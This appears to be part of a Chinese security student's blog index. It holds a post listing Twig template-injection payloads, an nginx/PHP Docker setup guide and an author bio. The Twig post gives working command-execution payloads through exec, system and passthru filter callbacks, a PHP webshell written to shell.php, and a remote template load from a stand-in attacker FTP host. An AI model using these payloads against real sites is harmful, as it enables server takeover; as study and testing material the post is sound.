            
            <tag> 学习记录 </tag>
            
            <tag> poc </tag>
            
            <tag> ssrf </tag>
            
            <tag> fastjson </tag>
            
            <tag> js沙箱逃逸 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>twig模板注入payload</title>
      <link href="/2021/08/20/twig-payload/"/>
      <url>/2021/08/20/twig-payload/</url>
      
        <content type="html"><![CDATA[<h2 id="twig的安装："><a href="#twig的安装：" class="headerlink" title="twig的安装："></a>twig的安装：</h2><p>twig存在1.x，2.x，3.x的多个版本，不同版本的payload也有所不同。我们选择安装3.x版本的twig并且使用PHP7.x运行。<br>使用composer一键安装：</p><pre class="line-numbers language-none"><code class="language-none">composer require "twig/twig:^3.0"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>建议事先建立好一个名为twig的文件夹，cd进入文件夹后进行安装，成功后得到如下的文件结构：<br><a href="http://www.m1saka.love/wp-content/uploads/2021/08/Screenshot-2021-08-20-102512.png"><img src="https://s2.loli.net/2022/03/09/wqefm3sjKb4o6nx.png" alt="img"></a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="twig1-x"><a href="#twig1-x" class="headerlink" title="twig1.x"></a>twig1.x</h3><p>测试代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/vendor/twig/twig/lib/Twig/Autoloader.php'</span><span class="token punctuation">;</span><span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>loader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>twig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span>loader<span class="token punctuation">)</span><span class="token punctuation">;</span>echotwig<span class="token operator">-&gt;</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在twig1.x下，存在全局变量_<strong>self</strong>,指向的是引用当前模板的实例，代码层面如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> specialVars <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'_self'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'this'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'_context'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'context'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'_charset'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'this-&gt;env-&gt;getCharset()'</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以利用_self变量，返回当前 \Twig\Template 实例，提供指向Twig_Environment的env属性，可以继续调用 Twig_Environment 中的其他方法，从而进行 SSTI。<br>比如以下 Payload 可以调用 setCache 方法改变 Twig 加载 PHP 文件的路径，在 allow_url_include 开启的情况下我们可以通过改变路径实现远程文件包含：</p><pre class="line-numbers language-none"><code class="language-none">{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>getFilter函数中存在危险函数call_user_func</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFilter</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token operator">...</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span>this<span class="token operator">-&gt;</span><span class="token property">filterCallbacks</span> <span class="token keyword">as</span> callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span>filter <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span>callback<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> filter<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token keyword">callable</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  this<span class="token operator">-&gt;</span><span class="token property">filterCallbacks</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token keyword">callable</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p><pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在twig2.x和3.x中_self的作用发生变化，此payload不能继续使用。</p><h3 id="twig2-x-amp-amp-3-x"><a href="#twig2-x-amp-amp-3-x" class="headerlink" title="twig2.x&amp;&amp;3.x"></a>twig2.x&amp;&amp;3.x</h3><p>测试代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span>loader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>ArrayLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>twig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Twig<span class="token punctuation">\</span>Environment</span><span class="token punctuation">(</span>loader<span class="token punctuation">)</span><span class="token punctuation">;</span>template <span class="token operator">=</span> twig<span class="token operator">-&gt;</span><span class="token function">createTemplate</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello {_GET['name']}!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$template</span><span class="token operator">-&gt;</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用map过滤器"><a href="#使用map过滤器" class="headerlink" title="使用map过滤器"></a>使用map过滤器</h4><pre class="line-numbers language-none"><code class="language-none">{{["calc"]|map("system")}}{{["calc"]|map("passthru")}}{{["calc"]|map("exec")}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们将传入的name值设为上面的payload，可以在Windows本地环境中成功执行：<br><a href="http://www.m1saka.love/wp-content/uploads/2021/08/Screenshot-2021-08-20-110030.png"><img src="https://s2.loli.net/2022/03/09/ZLHgBzCXnfTy7Uw.png" alt="img"></a><br>如果以上几个函数被禁用，我们还可以调用file_put_contents函数写一句话木马，生成webshell。</p><pre class="line-numbers language-none"><code class="language-none">{{{"&lt;?php phpinfo();eval($_POST[whoami])":"/var/www/html/shell.php"}|map("file_put_contents")}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>诸如此类方法有很多，在此就不一一进行列举。</p><h4 id="使用sort过滤器"><a href="#使用sort过滤器" class="headerlink" title="使用sort过滤器"></a>使用sort过滤器</h4><pre class="line-numbers language-none"><code class="language-none">{{["calc", 0]|sort("system")}}{{["calc", 0]|sort("passthru")}}{{["calc", 0]|sort("exec")}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="使用filter过滤器"><a href="#使用filter过滤器" class="headerlink" title="使用filter过滤器"></a>使用filter过滤器</h4><pre class="line-numbers language-none"><code class="language-none">{{["calc"]|filter("system")}}{{["calc"]|filter("passthru")}}{{["calc"]|filter("exec")}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="使用reduce过滤器"><a href="#使用reduce过滤器" class="headerlink" title="使用reduce过滤器"></a>使用reduce过滤器</h4><pre class="line-numbers language-none"><code class="language-none">{{[0, 0]|reduce("system", "calc")}}{{[0, 0]|reduce("passthru", "calc")}}{{[0, 0]|reduce("exec", "calc")}} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>参考（白嫖出处）：<a href="https://xz.aliyun.com/t/10056#toc-16">https://xz.aliyun.com/t/10056#toc-16</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> poc </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker_build_nginx+php</title>
      <link href="/2021/04/14/docker-build-nginx-php/"/>
      <url>/2021/04/14/docker-build-nginx-php/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01基本知识"><a href="#0x01基本知识" class="headerlink" title="0x01基本知识"></a>0x01基本知识</h2><h3 id="关于docker"><a href="#关于docker" class="headerlink" title="关于docker"></a>关于docker</h3><p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a> 并遵从 Apache2.0 协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p><p>docker教程：<a href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p><h3 id="关于nginx"><a href="#关于nginx" class="headerlink" title="关于nginx"></a>关于nginx</h3><p>Nginx是lgor Sysoev为俄罗斯访问量第二的rambler.ru站点设计开发的。从2004年发布至今，凭借开源的力量，已经接近成熟与完善。</p><p>Nginx功能丰富，可作为HTTP服务器，也可作为反向代理服务器，邮件服务器。支持FastCGI、SSL、Virtual Host、URL Rewrite、Gzip等功能。并且支持很多第三方的模块扩展。</p><p>Nginx的稳定性、功能集、示例配置文件和低系统资源的消耗让他后来居上，在全球活跃的网站中有12.18%的使用比率，大约为2220万个网站。</p><p>nginx详细教程：<a href="https://www.runoob.com/w3cnote/nginx-setup-intro.html">https://www.runoob.com/w3cnote/nginx-setup-intro.html</a></p><h3 id="关于php"><a href="#关于php" class="headerlink" title="关于php"></a>关于php</h3><p>此次使用的php版本及其拓展有php7.4和php7.4-fpm</p><p>PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个PHPFastCGI管理器，对于PHP 5.3.3之前的php来说，是一个补丁包 [1] ，旨在将FastCGI进程管理整合进PHP包中。如果你使用的是PHP5.3.3之前的PHP的话，就必须将它patch到你的PHP源代码中，在编译安装PHP后才可以使用。</p><h2 id="0x02搭建过程"><a href="#0x02搭建过程" class="headerlink" title="0x02搭建过程"></a>0x02搭建过程</h2><h3 id="docker建立容器详解"><a href="#docker建立容器详解" class="headerlink" title="docker建立容器详解"></a>docker建立容器详解</h3><p>首先需要讲一下docker的一些基本知识：</p><p>我们需要先获取官方给的一些docker镜像，比如在本次测试中我们需要先获得一个ubuntu的镜像：</p><p><code>docker pull ubuntu:latest</code></p><p>这样我们就能获得一个最近的ubuntu发行版镜像 现在应该是ubuntu20.04。我们可以利用docker images查看我们已经拉取的镜像：</p><p><img src="https://s2.loli.net/2022/03/09/Cm4gEXs9De6n5Wx.png" alt="img"></p><p>接下来我们使用如下的指令运行一个包含ubuntu20.04这个镜像的容器：</p><p><code>sudo docker run --name M1saka --dns 8.8.8.8 -itd -p 2333:80 ubuntu:latest</code></p><p>参数讲解：</p><ol><li>run：运行一个容器</li><li>–name：将这个容器命名，作为除了系统自动分配的容器id之外的容器标识，可以不加</li><li>–dns 给容器配置dns，设为8.8.8.8是为了方便联网。因为我是在kali虚拟机内进行的搭建，这一步能保证容器通网。不使用–net host方式的原因是本次搭建的容器将会使用端口映射，而–net host并不支持端口映射到本地上</li><li>-itd：实际上是-i -t -d的省略写法。-i是以交互模式运行容器，通常与 -t 同时使用；-t是为容器重新分配一个伪输入终端，通常与 -i 同时使用；-d是后台运行容器，并返回容器ID；</li><li>-p 2333:80将容器的80端口映射到本地的2333端口上，之所以要将容器的80端口映射出来是因为nginx的默认工作端口是80端口，方便配置，这样我们以后就能在浏览器输入127.0.0.1:2333来访问php服务</li><li>ubuntu:lastest：即为我们刚才pull的ubuntu官方镜像</li></ol><p>输入上面的指令后会返回一串字符，是计算机为我们的容器分配的id，接下来我们使用以下指令查询当前正在运行的容器：</p><p><code>**(**sudo**)** docker ps</code></p><p>结果如下截图：</p><p><img src="https://s2.loli.net/2022/03/09/QshEInk9HPy3ZKO.png" alt="img"></p><p>可以看到容器id；容器名称（M1saka）；映射端口等信息这个指令只能看到正在运行的容器，要想看到包括已经停止的容器可以在后面加上两个参数 -al</p><p>接下来我们使用以下指令进入容器：</p><p><code>sudo docker exec -it M1saka /bin/bash</code></p><p>exec指令进入容器的虚拟终端。我们在这里使用的是我们为容器命名的M1saka，也可以使用容器id的前几位进入。</p><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><p>首先我们要使用</p><p><code>apt update</code></p><p>对apt的软件包进行更新，否则apt无法定位软件包，不能一键安装。（校园网速感人，等了我好几分钟）</p><p>输入<code>apt-get install nginx -y</code></p><p>进行nginx最新版的安装，完成后在终端输入 </p><p><code>service nginx start</code></p><p> 启动服务。</p><p>接下来我们在本地的浏览器（kali虚拟机的浏览器）url输入127.0.0.1:2333就能看到nginx的界面，说明我们的nginx已经安装完成</p><p><img src="https://s2.loli.net/2022/03/09/HMsetKBySAfCEPh.png" alt="img"></p><h3 id="安装php7-4和php7-4-fpm"><a href="#安装php7-4和php7-4-fpm" class="headerlink" title="安装php7.4和php7.4-fpm"></a>安装php7.4和php7.4-fpm</h3><p>直接用apt-get install进行安装的话会找不到安装包，所以我们需要进行引导</p><p><code>apt-get install -y software-properties-common</code></p><p><code>add-apt-repository ppa:ondrej/php</code></p><p><code>apt-get update</code></p><p>然后就能进行php及其扩展的安装了</p><p><code>apt-get install php7.4 php7.4-fpm -y</code></p><p>至此，环境所需的依赖已经安装完</p><h3 id="nginx配置文件"><a href="#nginx配置文件" class="headerlink" title="nginx配置文件"></a>nginx配置文件</h3><p>编辑nginx的配置文件，使其与php7.3能够适配。</p><p>首先安装vim文档编辑器</p><p><code>apt-get install vim</code></p><p>启动php7.4-fpm</p><p><code>sudo service php7.4-fpm start</code></p><p>查看php7.4-fpm状态</p><p><code>sudo service php7.4-fpm status</code></p><p><img src="https://s2.loli.net/2022/03/09/fqLA8l5igJYKPGz.png" alt="img"></p><p>开始配置nginx文件</p><p><code>vim /etc/nginx/sites-available/default</code></p><p>如下图</p><p><img src="https://s2.loli.net/2022/03/09/5KbdDaCT47ioXkB.png" alt="img"></p><ul><li>第41行是网站根目录，这里是默认的/var/www/html</li><li>第44行最后加上index.php，默认解析的文件</li><li>56行57行和60行井号删除</li><li>在最后的一行添加一个中括号进行闭合，否则无法运行</li></ul><p>运行 </p><p><code>nginx -t</code></p><p> 查看配置文件是否能正常加载</p><p>运行 </p><p><code>service nginx restart</code></p><p> 重启nginx服务</p><p>在根目录下添加index.php，内容自定义，用于测试</p><p>在浏览器url输入127.0.0.1:2333/index.php可以看到php文件已经解析。</p><p><img src="https://s2.loli.net/2022/03/09/P6t8BdzlaorymAe.png" alt="img"></p><h3 id="保存容器为镜像"><a href="#保存容器为镜像" class="headerlink" title="保存容器为镜像"></a>保存容器为镜像</h3><p><code>sudo docker commit M1saka misaka</code></p><p>将我们的M1saka容器存储为m1saka镜像，方便下次使用。</p><p>镜像名不能含有大写字母</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>about me</title>
      <link href="/2001/07/12/about-me/"/>
      <url>/2001/07/12/about-me/</url>
      
        <content type="html"><![CDATA[<h3 id="个人简介"><a href="#个人简介" class="headerlink" title="个人简介"></a>个人简介</h3><ul><li>Wh1teR0be</li><li>南京邮电大学2019届信息安全本科在读</li><li>小绿草信息安全实验室成员，研究方向：web安全</li><li>ctf战队X1cT34m成员</li><li>江苏省网络安全高校联盟、ctf战队SU team成员</li><li>(前任)网络安全工程师@华为终端bg</li><li>安全工程师@阿里巴巴</li></ul><hr><h3 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h3><ul><li>Email：<a href="mailto:wanlitong11@gmail.com">wanlitong11@gmail.com</a></li><li>GitHub: <a href="https://github.com/L1gh73r">https://github.com/L1gh73r</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
